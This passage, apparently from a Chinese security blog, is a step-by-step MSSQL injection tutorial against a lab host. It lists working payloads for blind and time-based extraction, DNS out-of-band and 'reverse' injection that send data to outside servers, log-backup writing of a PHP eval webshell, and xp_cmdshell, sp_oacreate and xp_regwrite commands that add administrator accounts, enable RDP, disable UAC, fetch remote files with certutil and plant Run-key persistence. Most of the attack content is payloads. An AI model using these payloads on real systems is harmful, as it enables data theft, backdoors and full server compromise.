from test..syscolumns where id=(select id from sysobjects where xtype=&#x27;U&#x27; and name=&#x27;users&#x27;)))&gt;1	#判断users表的第3个字段的长度</span><br></pre></td></tr></table></figure>

<h3 id="猜解字段名"><a href="#猜解字段名" class="headerlink" title="猜解字段名"></a>猜解字段名</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:8205/?id=1 and ascii(substring((select top 1 name from test..syscolumns where id=(select id from sysobjects where xtype=&#x27;U&#x27; and name=&#x27;users&#x27;)),1,1))&gt;100	#猜解users表的第1个字段名</span><br><span class="line"></span><br><span class="line">http://hackrock.com:8205/?id=1 and ascii(substring((select top 1 name from test..syscolumns where id=(select id from sysobjects where xtype=&#x27;U&#x27; and name=&#x27;users&#x27;) and name not in (select top 1 name from test..syscolumns where id=(select id from sysobjects where xtype=&#x27;U&#x27; and name=&#x27;users&#x27;))),1,1))&gt;100	#猜解users表的第2个字段名</span><br><span class="line"></span><br><span class="line">http://hackrock.com:8205/?id=1 and ascii(substring((select top 1 name from test..syscolumns where id=(select id from sysobjects where xtype=&#x27;U&#x27; and name=&#x27;users&#x27;) and name not in (select top 2 name from test..syscolumns where id=(select id from sysobjects where xtype=&#x27;U&#x27; and name=&#x27;users&#x27;))),1,1))&gt;100	#猜解users表的第3个字段名</span><br></pre></td></tr></table></figure>

<h3 id="猜解数据"><a href="#猜解数据" class="headerlink" title="猜解数据"></a>猜解数据</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:8205/?id=1 and ascii(substring((select top 1 username from users),1,1))&gt;100	#猜解users表的username字段的值</span><br></pre></td></tr></table></figure>

<h2 id="时间型盲注"><a href="#时间型盲注" class="headerlink" title="时间型盲注"></a>时间型盲注</h2><p><code>WAITFOR</code>是SQL Server中Transact-SQL提供的⼀个流程控制语句。它的作⽤就是等待特定时间，然后继续执⾏后 续的语句。它包含⼀个参数<code>DELAY</code>，⽤来指定等待的时间。</p>
<p>如果将该语句成功注⼊后，会造成数据库返回记录和 Web请求也会响应延迟特定的时间。由于该语句不涉及条件判断等情况，所以容易注⼊成功。根据Web请求是否有<code>延迟</code>，渗透测试⼈员就可以判断⽹站是否存在注⼊漏洞。同时，由于该语句并不返回特定内容，所以它也是盲注的重要检测⽅法。</p>
<p>时间型盲注payload在布尔型盲注的基础上进行改进，所以这里简单举几个例子。</p>
<h3 id="猜解数据库名-1"><a href="#猜解数据库名-1" class="headerlink" title="猜解数据库名"></a>猜解数据库名</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:8205/?id=1 if (ascii(substring((select db_name()),1,1))&gt;100) waitfor delay &#x27;0:0:3&#x27; 	#若延迟3秒以上，说明当前数据库第1个字符的ASCII码值大于100</span><br></pre></td></tr></table></figure>

<h3 id="猜解表名-1"><a href="#猜解表名-1" class="headerlink" title="猜解表名"></a>猜解表名</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:8205/?id=1 if ((select ascii(substring((select top 1 name from test..sysobjects where xtype=&#x27;U&#x27;),1,1)))&gt;100) waitfor delay &#x27;0:0:3&#x27;		#判断users表的第1个字段的长度</span><br><span class="line"></span><br><span class="line">http://hackrock.com:8205/?id=1 if ((select top 1 len(name) from test..syscolumns where id=(select id from sysobjects where xtype=&#x27;U&#x27; and name=&#x27;users&#x27;) and name not in (select top 1 name from test..syscolumns where id=(select id from sysobjects where xtype=&#x27;U&#x27; and name=&#x27;users&#x27;)))&gt;1) waitfor delay &#x27;0:0:3&#x27;	#猜解第2张表的表名</span><br><span class="line"></span><br><span class="line">http://hackrock.com:8205/?id=1 if ((select top 1 len(name) from test..syscolumns where id=(select id from sysobjects where xtype=&#x27;U&#x27; and name=&#x27;users&#x27;) and name not in (select top 2 name from test..syscolumns where id=(select id from sysobjects where xtype=&#x27;U&#x27; and name=&#x27;users&#x27;)))&gt;1) waitfor delay &#x27;0:0:3&#x27;	#猜解第3张表的表名</span><br></pre></td></tr></table></figure>

<h3 id="猜解字段名-1"><a href="#猜解字段名-1" class="headerlink" title="猜解字段名"></a>猜解字段名</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:8205/?id=1 if (ascii(substring((select top 1 name from test..syscolumns where id=(select id from sysobjects where xtype=&#x27;U&#x27; and name=&#x27;users&#x27;)),1,1))&gt;100) waitfor delay &#x27;0:0:3&#x27;		#猜解users表的第1个字段名</span><br><span class="line"></span><br><span class="line">http://hackrock.com:8205/?id=1 if (ascii(substring((select top 1 name from test..syscolumns where id=(select id from sysobjects where xtype=&#x27;U&#x27; and name=&#x27;users&#x27;) and name not in (select top 1 name from test..syscolumns where id=(select id from sysobjects where xtype=&#x27;U&#x27; and name=&#x27;users&#x27;))),1,1))&gt;100) waitfor delay &#x27;0:0:3&#x27;		#猜解users表的第2个字段名</span><br><span class="line"></span><br><span class="line">http://hackrock.com:8205/?id=1 if (ascii(substring((select top 1 name from test..syscolumns where id=(select id from sysobjects where xtype=&#x27;U&#x27; and name=&#x27;users&#x27;) and name not in (select top 2 name from test..syscolumns where id=(select id from sysobjects where xtype=&#x27;U&#x27; and name=&#x27;users&#x27;))),1,1))&gt;100) waitfor delay &#x27;0:0:3&#x27;		#猜解users表的第2个字段名</span><br></pre></td></tr></table></figure>

<h3 id="猜解数据-1"><a href="#猜解数据-1" class="headerlink" title="猜解数据"></a>猜解数据</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:8205/?id=1 if (ascii(substring((select top 1 username from users),1,1))&gt;100) waitfor delay &#x27;0:0:3&#x27;	#猜解users表的username字段的值</span><br></pre></td></tr></table></figure>

<h2 id="DNS带外通信注入"><a href="#DNS带外通信注入" class="headerlink" title="DNS带外通信注入"></a>DNS带外通信注入</h2><p>关于带外通信注入的知识点在MySQL数据库注入中讲到过，这里就直接上payload了。</p>
<h3 id="获取数据库名-2"><a href="#获取数据库名-2" class="headerlink" title="获取数据库名"></a>获取数据库名</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:8205/?id=1;declare @a char(128);set @a=&#x27;\\&#x27;%2buser%2b&#x27;.bp1itz.dnslog.cn\abc&#x27;;exec master..xp_dirtree @a		#获取用户名</span><br><span class="line"></span><br><span class="line">http://hackrock.com:8205/?id=1;declare @a char(128);set @a=&#x27;\\&#x27;%2bdb_name()%2b&#x27;.bp1itz.dnslog.cn\abc&#x27;;exec master..xp_dirtree @a  #获取当前数据库名</span><br></pre></td></tr></table></figure>

<h3 id="获取表名-2"><a href="#获取表名-2" class="headerlink" title="获取表名"></a>获取表名</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:8205/?id=1;declare @a char(128);set @a=&#x27;\\&#x27;%2b(select top 1 name from test.sys.sysobjects where xtype=&#x27;U&#x27;)%2b&#x27;.bp1itz.dnslog.cn\abc&#x27;;exec master..xp_dirtree @a		#获取当前表名</span><br><span class="line"></span><br><span class="line">http://hackrock.com:8205/?id=1;declare @a char(128);set @a=&#x27;\\&#x27;%2b(select top 1 name from test.sys.sysobjects where xtype=&#x27;U&#x27; and name not in (select top 1 name from test.sys.sysobjects where xtype=&#x27;U&#x27;))%2b&#x27;.bp1itz.dnslog.cn\abc&#x27;;exec master..xp_dirtree @a			#获取第2张表名</span><br></pre></td></tr></table></figure>

<h3 id="获取字段名-2"><a href="#获取字段名-2" class="headerlink" title="获取字段名"></a>获取字段名</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:8205/?id=1;declare @a char(128);set @a=&#x27;\\&#x27;%2b(select top 1 name from syscolumns where id in (select id from test.sys.sysobjects where name=&#x27;users&#x27;))%2b&#x27;.bp1itz.dnslog.cn\abc&#x27;;exec master..xp_dirtree @a	#获取users表的第1个字段名</span><br><span class="line"></span><br><span class="line">http://hackrock.com:8205/?id=1;declare @a char(128);set @a=&#x27;\\&#x27;%2b(select top 1 name from test..syscolumns where id=(select id from sysobjects where xtype=&#x27;U&#x27; and name=&#x27;users&#x27;) and name not in (select top 1 name from test..syscolumns where id=(select id from sysobjects where xtype=&#x27;U&#x27; and name=&#x27;users&#x27;)))%2b&#x27;.bp1itz.dnslog.cn\abc&#x27;;exec master..xp_dirtree @a	#获取users表的第1个字段名</span><br><span class="line"></span><br><span class="line">http://hackrock.com:8205/?id=1;declare @a char(128);set @a=&#x27;\\&#x27;%2b(select top 1 name from test..syscolumns where id=(select id from sysobjects where xtype=&#x27;U&#x27; and name=&#x27;users&#x27;) and name not in (select top 2 name from test..syscolumns where id=(select id from sysobjects where xtype=&#x27;U&#x27; and name=&#x27;users&#x27;)))%2b&#x27;.bp1itz.dnslog.cn\abc&#x27;;exec master..xp_dirtree @a	#获取users表的第3个字段名</span><br></pre></td></tr></table></figure>

<h3 id="获取数据-2"><a href="#获取数据-2" class="headerlink" title="获取数据"></a>获取数据</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:8205/?id=1;declare @a char(128);set @a=&#x27;\\&#x27;%2brtrim(cast((select top 1 username from users)as varchar))%2b&#x27;.o9i6yq.dnslog.cn\abc&#x27;;exec master..xp_dirtree @a	#rtrim()函数作用为去除字符串右边的空格；cast()函数的作用为将查询到的数据转换为相应的类型</span><br></pre></td></tr></table></figure>

<h2 id="反弹注入"><a href="#反弹注入" class="headerlink" title="反弹注入"></a>反弹注入</h2><p>有时候，明明是sql注入的点，却无法进行注入，注射工具拆解的速度异常的缓慢，错误提示信息关闭，无法返回注入的结果，这个时候你便可以尝试使用反弹注入。</p>
<p>反弹注入需要依赖于函数<code>opendatasource()</code>的支持，将当前数据库中的查询结果发送到另一数据库服务器中。</p>
<p>注：<code>openrowset()函数也可实现</code></p>
<p>MSSQL<strong>反弹注入语句解析</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">insert into</span><br><span class="line">opendatasource(&#x27;sqloledb&#x27;,&#x27;server=SQL5009.webweb.com,1433;uid=DB_14A5E44_zkaq_admin;pwd=zkaqzkaq;database=DB_14A5E44_zkaq&#x27;).DB_14A5E44_zkaq.dbo.temp</span><br><span class="line">select * from admin –</span><br><span class="line"></span><br><span class="line">server=连接地址,端口;uid=用户名;pwd=密码;database=数据库名称</span><br></pre></td></tr></table></figure>

<p><strong>实验演示数据</strong>：</p>
<blockquote>
<p>连接服务器地址：192.168.123.120</p>
<p>连接数据库名：test_inject</p>
<p>连接数据库用户名：sa</p>
<p>连接数据库密码：Hacker1961</p>
<p>创建一个4个字段的表：test_table</p>
<p>注：在实际渗透过程中切勿使用sa用户进行反弹注入，并且使用云主机的数据库连接，这里只是作为演示。</p>
</blockquote>
<p>如果在使用反弹注入的过程中报错：<code>SQL Server 阻止了对组件 &#39;Ad Hoc Distributed Queries&#39; 的 STATEMENT&#39;OpenRowset/OpenDatasource&#39; 的访问</code>,则需要开启Ad Hoc Distributed Queries组件，执行语句如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">exec sp_configure &#x27;show advanced options&#x27;,1</span><br><span class="line">reconfigure</span><br><span class="line">exec sp_configure &#x27;Ad Hoc Distributed Queries&#x27;,1</span><br><span class="line">reconfigure</span><br></pre></td></tr></table></figure>

<h3 id="获取数据库名-3"><a href="#获取数据库名-3" class="headerlink" title="获取数据库名"></a>获取数据库名</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:8205/?id=1;insert into opendatasource(&#x27;sqloledb&#x27;,&#x27;server=192.168.123.120,1433;uid=sa;pwd=Hacker1961;database=test_inject&#x27;).test_inject.dbo.test_table select name,null,null,null from master.dbo.sysdatabases		#获取所有数据库名</span><br></pre></td></tr></table></figure>

<p>查看连接数据库</p>
<p><img src="https://cdn.jsdelivr.net/gh/UlyssesTakusen/picture/img/202110061052597.png" alt="70bb15cdc04788f8a7f933d59b34ab0d.png"></p>
<h3 id="获取表名-3"><a href="#获取表名-3" class="headerlink" title="获取表名"></a>获取表名</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:8205/?id=1;insert into opendatasource(&#x27;sqloledb&#x27;,&#x27;server=192.168.123.120,1433;uid=sa;pwd=Hacker1961;database=test_inject&#x27;).test_inject.dbo.test_table select null,name,null,null from test.sys.sysobjects where xtype=&#x27;U&#x27;	#获取test数据库的所有表名</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/UlyssesTakusen/picture/img/202110061050778.png" alt="546032b90c724469e04d387ffabafabb.png"></p>
<h3 id="获取字段名-3"><a href="#获取字段名-3" class="headerlink" title="获取字段名"></a>获取字段名</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:8205/?id=1;insert into opendatasource(&#x27;sqloledb&#x27;,&#x27;server=192.168.123.120,1433;uid=sa;pwd=Hacker1961;database=test_inject&#x27;).test_inject.dbo.test_table select null,null,name,null from syscolumns where id in (select id from test.sys.sysobjects where name=&#x27;users&#x27;)	#获取users表中的所有列名</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/UlyssesTakusen/picture/img/202110061051335.png" alt="c021a769ae8ddc5df5eb95b078a57ddc.png"></p>
<h3 id="获取数据-3"><a href="#获取数据-3" class="headerlink" title="获取数据"></a>获取数据</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:8205/?id=1;insert into opendatasource(&#x27;sqloledb&#x27;,&#x27;server=192.168.123.120,1433;uid=sa;pwd=Hacker1961;database=test_inject&#x27;).test_inject.dbo.test_table select username,password,null,null from users		#获取users表中的所有数据</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/UlyssesTakusen/picture/img/202110061052589.png" alt="c315e3af7df738724c85f1456302ea96.png"></p>
<h2 id="DB-owner权限写WebShell"><a href="#DB-owner权限写WebShell" class="headerlink" title="DB_owner权限写WebShell"></a>DB_owner权限写WebShell</h2><p>无论是LOG备份还是差异备份，都是利用备份的过程中写入一句话木马。</p>
<h3 id="判断是否拥有db-owner权限"><a href="#判断是否拥有db-owner权限" class="headerlink" title="判断是否拥有db_owner权限"></a>判断是否拥有db_owner权限</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:8205/?id=1 and 1=(select is_member(&#x27;db_owner&#x27;))	#若返回正常数据，则拥有db_owner权限</span><br></pre></td></tr></table></figure>

<h3 id="利用xp-dirtree查找物理目录"><a href="#利用xp-dirtree查找物理目录" class="headerlink" title="利用xp_dirtree查找物理目录"></a>利用xp_dirtree查找物理目录</h3><p>如果我们用DB权限写入一句话是需要知道web目录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:8205/?id=1;create table temp(dir nvarchar(255),depth varchar(255),files varchar(255),id int not null identity(1,1))			#创建一张临时表</span><br><span class="line"></span><br><span class="line">http://hackrock.com:8205/?id=1;insert into temp(dir,depth,files) exec master.dbo.xp_dirtree &#x27;c:&#x27;,1,1 	#利用xp_dirtree 查询，将指定目录文件和文件夹插入到临时表中，这里查询的是C盘目录</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/UlyssesTakusen/picture/img/202110061051967.png" alt="ba6e0aa3cd637aebe0d6cbd888589500.png"></p>
<p>可以通过sql注入，查找temp表下的dir字段的值即可得到c盘下的文件与文件夹</p>
<p>可以通过此方式，查询Web根目录</p>
<blockquote>
<p>注：</p>
<p>execute master..xp_dirtree ‘c:’ –列出所有c:\文件、目录、子目录</p>
<p>execute master..xp_dirtree ‘c:’,1 –只列c:\目录</p>
<p>execute master..xp_dirtree ‘c:’,1,1 –列c:\目录、文件</p>
</blockquote>
<p><strong>SQLServer常见的备份策略</strong></p>
<ul>
<li>每周一次完整备份</li>
<li>每天一次差异备份</li>
<li>每小时一次事务日志备份</li>
</ul>
<h3 id="LOG备份写入WebShell"><a href="#LOG备份写入WebShell" class="headerlink" title="LOG备份写入WebShell"></a>LOG备份写入WebShell</h3><p><strong>利用前提</strong>：</p>
<ul>
<li>目标机器存在数据库备份文件 ，也就是如果我们利用 test 数据库的话，则需要该test数据库存在数据库备份文件，而且恢复模式得是 完整模式</li>
<li>知道网站的绝对路径</li>
<li>该注入支持堆叠注入</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:8205/?id=1;alter database test set RECOVERY FULL	#修改数据库恢复模式为 完整模式</span><br><span class="line"></span><br><span class="line">http://hackrock.com:8205/?id=1;create table cmd (a image)				#创建一张表cmd，只有一个列 a，类型为image</span><br><span class="line"></span><br><span class="line">http://hackrock.com:8205/?id=1;backup log test to disk= &#x27;C:\Wamp\apache2.4\htdocs\WWW\1.php&#x27; with init		#备份表到指定路径</span><br><span class="line"></span><br><span class="line">    http://hackrock.com:8205/?id=1;insert into cmd (a) values(0x3c3f70687020406576616c28245f504f53545b785d293b3f3e)	#插入一句话到cmd表里，其中0x3c3f70687020406576616c28245f504f53545b785d293b3f3e 是一句话木马 &lt;?php @eval($_POST[x]);?&gt; 的16进制表示</span><br><span class="line"></span><br><span class="line">http://hackrock.com:8205/?id=1;backup log test to disk= &#x27;C:\Wamp\apache2.4\htdocs\WWW\2.php&#x27;		#把操作日志备份到指定文件</span><br><span class="line"></span><br><span class="line">http://hackrock.com:8205/?id=1;drop table cmd;			#删除cmd表</span><br></pre></td></tr></table></figure>

<p>执行完成后会在目标网站根目录下生成1.php和2.php文件，其中1.php 保存数据库，2.php就是我们需要连接的木马文件。</p>
<p><img src="https://cdn.jsdelivr.net/gh/UlyssesTakusen/picture/img/202110061051656.png" alt="91472d32967d1548756fa36a60424fcc.png"></p>
<h3 id="差异备份写入WebShell"><a href="#差异备份写入WebShell" class="headerlink" title="差异备份写入WebShell"></a>差异备份写入WebShell</h3><p>注：差异备份有概率会把网站搞崩，所以不建议使用差异备份</p>
<p><strong>利用前提</strong>：</p>
<ul>
<li>知道网站的绝对路径</li>
<li>该注入支持堆叠注入</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:8205/?id=1;backup database test to disk=&#x27;C:\temp\tmp.bak&#x27;</span><br><span class="line"></span><br><span class="line">http://hackrock.com:8205/?id=1;create table [dbo].[test_tmp] ([cmd] [image])</span><br><span class="line"></span><br><span class="line">http://hackrock.com:8205/?id=1;insert into [test_tmp](cmd) values(0x3c3f70687020406576616c28245f504f53545b785d293b3f3e)</span><br><span class="line"></span><br><span class="line">http://hackrock.com:8205/?id=1;backup database test to disk=&#x27;C:\Wamp\apache2.4\htdocs\WWW\shell.php&#x27; with differential,format</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/UlyssesTakusen/picture/img/202110061051758.png" alt="65ed0b9a7780f4d0fb89684122fb0a6e.png"></p>
<h2 id="SA权限执行系统命令"><a href="#SA权限执行系统命令" class="headerlink" title="SA权限执行系统命令"></a>SA权限执行系统命令</h2><h3 id="MSSQL扩展存储过程"><a href="#MSSQL扩展存储过程" class="headerlink" title="MSSQL扩展存储过程"></a>MSSQL扩展存储过程</h3><p>扩展存储过程是MSSQL提供的特殊功能。所谓“扩展存储过程”其实就是一个普通的Windows系统DLL文件，按照某种规则实现了某些函数功能，MSSQL利用扩展存储可以实现许多强大的功能，包括对系统进行操作，利用这个特性，在实施MSSQL注入攻击时，可以更容易地对系统进行控制。</p>
<blockquote>
<p><strong>攻击中最常利用的扩展存储</strong></p>
<p>xp_cmdshell ——可以直接执行系统命令</p>
<p>sp_oacreate ——可以执行系统命令</p>
<p>xp_regread ——可以进行注册表读取</p>
<p>xp_regwrite ——可以写入注册表</p>
<p>xp_regdeletevalue ——删除注册表值</p>
<p>xp_dirtree ——可以进行列目录操作</p>
<p>xp_password ——更改密码</p>
<p>xp_servicecontrol ——停止或激活某服务</p>
<p>sp_addlogin ——创建新的SQLServer登录</p>
<p>sp_dropuser ——从当前数据库中删除数据库用户</p>
<p>sp_enumgroups ——提供本地组列表或在指定的域中定义全局组列表</p>
<p>xp_enumds ——可以进行ODBC连接</p>
<p>xp_loginconfig ——可以配置服务器安全模式信息</p>
<p>xp_makecab ——可以创建压缩卷</p>
<p>xp_ntsec_enumdomains ——可以查看domain信息</p>
<p>xp_terminate_jroces ——可以查看终端进程，给出一个进程PID</p>
</blockquote>
<h3 id="xp-cmdshell"><a href="#xp-cmdshell" class="headerlink" title="xp_cmdshell"></a>xp_cmdshell</h3><p>xp_cmdshell这个存储过程可以用来执行cmd命令。</p>
<h4 id="查看扩展是否存在"><a href="#查看扩展是否存在" class="headerlink" title="查看扩展是否存在"></a>查看扩展是否存在</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:8205/?id=1 and 1=(select count(*) from master.dbo.sysobjects where xtype=&#x27;X&#x27; and name=&#x27;xp_cmdshell&#x27;) 		#若正常显示，则xp_cmdshell扩展已存在</span><br></pre></td></tr></table></figure>

<h4 id="开启扩展"><a href="#开启扩展" class="headerlink" title="开启扩展"></a>开启扩展</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:8205/?id=1;execute(&#x27;sp_configure &quot;show advanced options&quot;,1&#x27;)  #将该选项的值设置为1</span><br><span class="line">http://hackrock.com:8205/?id=1;execute(&#x27;reconfigure&#x27;)                             #保存设置</span><br><span class="line">http://hackrock.com:8205/?id=1;execute(&#x27;sp_configure &quot;xp_cmdshell&quot;, 1&#x27;)           #将xp_cmdshell的值设置为1</span><br><span class="line">http://hackrock.com:8205/?id=1;execute(&#x27;reconfigure&#x27;)                             #保存设置</span><br><span class="line"></span><br><span class="line">或者</span><br><span class="line"></span><br><span class="line">http://hackrock.com:8205/?id=1;exec sp_configure &#x27;show advanced options&#x27;,1;       </span><br><span class="line">http://hackrock.com:8205/?id=1;reconfigure;                                       </span><br><span class="line">http://hackrock.com:8205/?id=1;exec sp_configure &#x27;xp_cmdshell&#x27;,1;                 </span><br><span class="line">http://hackrock.com:8205/?id=1;reconfigure;                                      </span><br></pre></td></tr></table></figure>

<h4 id="执行系统命令"><a href="#执行系统命令" class="headerlink" title="执行系统命令"></a>执行系统命令</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">添加用户</span><br><span class="line">http://hackrock.com:8205/?id=1;exec xp_cmdshell &#x27;net user hacker$ Admin12345 /add&#x27;</span><br><span class="line">http://hackrock.com:8205/?id=1;exec xp_cmdshell &#x27;net localgroup administrators hacker$ /add&#x27;</span><br><span class="line"></span><br><span class="line">开启远程桌面</span><br><span class="line">http://hackrock.com:8205/?id=1;exec xp_cmdshell &#x27;reg add &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections /t reg_dword /d 0 /f&#x27;;exec xp_cmdshell &#x27;reg add &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp&quot; /v PortNumber /t reg_dword /d 3389 /f&#x27;;exec xp_cmdshell &#x27;reg add &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /v PortNumber /t reg_dword /d 3389 /f&#x27;</span><br></pre></td></tr></table></figure>

<h3 id="sp-oacreate"><a href="#sp-oacreate" class="headerlink" title="sp_oacreate"></a>sp_oacreate</h3><p>使用sp_oacreate提权前提条件：</p>
<ul>
<li>SQLServer数据库服务未降权 （因为需要调用COM组件）</li>
</ul>
<p>我们可以借助SQLServer中的COM组件sp_oacreate来执行系统命令，使用下面命令查看是否可使用 sp_oacreate 执行系统命令。</p>
<h4 id="查看扩展是否存在-1"><a href="#查看扩展是否存在-1" class="headerlink" title="查看扩展是否存在"></a>查看扩展是否存在</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:8205/?id=1 and 1=(select count(*) from master.dbo.sysobjects where xtype=&#x27;X&#x27; and name=&#x27;sp_oacreate&#x27;) 		#若正常显示，则sp_oacreate扩展已存在</span><br></pre></td></tr></table></figure>

<h4 id="开启扩展-1"><a href="#开启扩展-1" class="headerlink" title="开启扩展"></a>开启扩展</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:8205/?id=1;exec sp_configure &#x27;show advanced options&#x27;,1;reconfigure;</span><br><span class="line">http://hackrock.com:8205/?id=1;exec sp_configure &#x27;ole automation procedures&#x27;,1;reconfigure;</span><br></pre></td></tr></table></figure>

<h4 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">复制文件</span><br><span class="line">http://hackrock.com:8205/?id=1;declare @o int;exec sp_oacreate &#x27;scripting.filesystemobject&#x27;, @o out;exec sp_oamethod @o, &#x27;copyfile&#x27;,null,&#x27;c:\1.txt&#x27;,&#x27;c:\2.txt&#x27;</span><br><span class="line"></span><br><span class="line">移动文件</span><br><span class="line">http://hackrock.com:8205/?id=1;declare @o int;exec sp_oacreate &#x27;scripting.filesystemobject&#x27;, @o out;exec sp_oamethod @o, &#x27;movefile&#x27;,null,&#x27;c:\1.txt&#x27;,&#x27;c:\temp\2.txt&#x27;</span><br><span class="line"></span><br><span class="line">删除文件</span><br><span class="line">http://hackrock.com:8205/?id=1;declare @o int;exec sp_oacreate &#x27;scripting.filesystemobject&#x27;, @o out;exec sp_oamethod @o, &#x27;deletefile&#x27;,null,&#x27;c:\1.txt&#x27;</span><br></pre></td></tr></table></figure>

<h4 id="调用wcsript-shell执行命令"><a href="#调用wcsript-shell执行命令" class="headerlink" title="调用wcsript.shell执行命令"></a>调用wcsript.shell执行命令</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">远程关机</span><br><span class="line">http://hackrock.com:8205/?id=1;declare @shell int;exec sp_oacreate &#x27;wscript.shell&#x27;,@shell output;exec sp_oamethod @shell,&#x27;run&#x27;,null,&#x27;shutdown -p&#x27;</span><br><span class="line"></span><br><span class="line">远程下载文件</span><br><span class="line">http://hackrock.com:8205/?id=1;declare @shell int;exec sp_oacreate &#x27;wscript.shell&#x27;,@shell output;exec sp_oamethod @shell,&#x27;run&#x27;,null,&#x27;certutil -urlcache -split -f http://192.168.123.42/1.txt c:\1.txt&#x27;</span><br></pre></td></tr></table></figure>

<h3 id="xp-regwrite"><a href="#xp-regwrite" class="headerlink" title="xp_regwrite"></a>xp_regwrite</h3><p>在sa权限下可以调用xp_rewrite写入注册表。</p>
<h4 id="注册表写入"><a href="#注册表写入" class="headerlink" title="注册表写入"></a>注册表写入</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">将命令写入注册表启动项</span><br><span class="line">http://hackrock.com:8205/?id=1;exec xp_regwrite &#x27;HKEY_LOCAL_MACHINE&#x27;,&#x27;SOFTWARE\Microsoft\Windows\CurrentVersion\Run&#x27;,&#x27;black&#x27;,&#x27;REG_SZ&#x27;,&#x27;net user test test /add&#x27;</span><br><span class="line"></span><br><span class="line">关闭UAC</span><br><span class="line">http://hackrock.com:8205/?id=1;exec xp_regwrite &#x27;HKEY_LOCAL_MACHINE&#x27;,&#x27;SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System&#x27;,&#x27;EnableLUA&#x27;,&#x27;REG_DWORD&#x27;,0</span><br></pre></td></tr></table></figure>

<h4 id="启用沙盒模式进行命令执行"><a href="#启用沙盒模式进行命令执行" class="headerlink" title="启用沙盒模式进行命令执行"></a>启用沙盒模式进行命令执行</h4><ul>
<li>当执行命令方法无法使用时，可以使用沙盒进行提权。沙盒模式（SandBoxMode）是一种安全功能。在沙盒模式下，Access 只对控件和字段属性中的安全且不含恶意代码的表达式求值。如果表达式不使用可能以某种方式损坏数据的函数或属性，则可认为它是安全的。例如，诸如Kill和Shell之类的函数可能被用来损坏计算机上的数据和文件，因此它们被视为不安全的。当Access以沙盒模式运行时，调用这些函数的表达式将会产生错误消息。</li>
<li>OLE DB：OLE DB Driver for SQL Server 是用于访问数据的底层 COM API，是应用程序链接到SQL Server的的驱动程序。</li>
<li>其核心其实是修改注册表，默认情况下，注册表中mdb数据库不允许执行系统命令，但是开启沙盒模式，就准许mdb文件执行数据库，通过查询方式调用mdb文件，执行参数，绕过系统本身自己的执行命令，实现mdb文件执行命令。</li>
</ul>
<p><strong>注册表关闭沙盒模式</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:8205/?id=1;exec xp_regwrite &#x27;HKEY_LOCAL_MACHINE&#x27;,&#x27;SOFTWARE\Microsoft\Jet\4.0\Engines&#x27;,&#x27;SandBoxMode&#x27;,&#x27;REG_DWORD&#x27;,0</span><br></pre></td></tr></table></figure>

<p><strong>开启外围组件</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:8205/?id=1;exec sp_configure &#x27;show advanced options&#x27;,1;reconfigure;</span><br><span class="line">http://hackrock.com:8205/?id=1;exec sp_configure &#x27;Ad Hoc Distributed Queries&#x27;,1;reconfigure;</span><br></pre></td></tr></table></figure>

<p><strong>执行命令</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:8205/?id=1;select * from openrowset(&#x27;microsoft.jet.oledb.4.0&#x27;,&#x27;;database=c:\windows\system32\ias\ias.mdb&#x27;,&#x27;select shell(&quot;cmd.exe /c net user estelle 123456 /add&quot;)&#x27;)</span><br></pre></td></tr></table></figure>

<p>注：该方法在32位系统下会出错</p>
]]></content>
      <categories>
        <category>Web安全</category>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
      </tags>
